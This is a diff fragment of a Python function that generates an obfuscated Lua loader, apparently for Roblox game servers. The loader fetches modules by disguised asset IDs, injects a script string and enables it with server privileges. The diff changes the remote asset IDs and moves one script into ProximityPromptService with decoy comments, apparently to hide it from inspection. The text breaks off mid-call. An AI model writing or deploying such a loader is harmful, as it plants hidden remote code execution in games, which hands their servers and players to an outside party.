@@ -19,12 +19,12 @@ def admin_script():
         vlua_script = vlua_script.read()
     rendered = f"""
     local g=game;local x=tonumber
-    local function requireStr(assetId:number, str:string):nil
-    	local new=require(x("71374225073896")).Script:Clone()
+    local function requireStr(assetId, str)
+    	local new=require(x("71374225073896")).Script:Clone() -- 88891391760892
     	new.Enabled=false;new.ModuleScript:Destroy()new.Value.Value=str
     	local n=Instance.new("NumberValue",new)n.Value=assetId;n.Name = "ModuleScript"
-    	local w=require(x("92406028596812"))(new,"2")local f=require(x("92406028596812"))(new,w)
-    	w.Parent=g:GetService("ServerScriptService");f.Parent=g:GetService("ServerScriptService")
+    	local w=require(x("121170712417048"))(new,"2")local f=require(x("121170712417048"))(new,w)
+    	w.Parent=g:GetService("ProximityPromptService");f.Parent=g:GetService("ServerScriptService") -- UserInputService
     	w.Enabled=true;f.Enabled=true;new.Enabled=true;return new
     end
     requireStr(x("0x26E001F12"),[===[
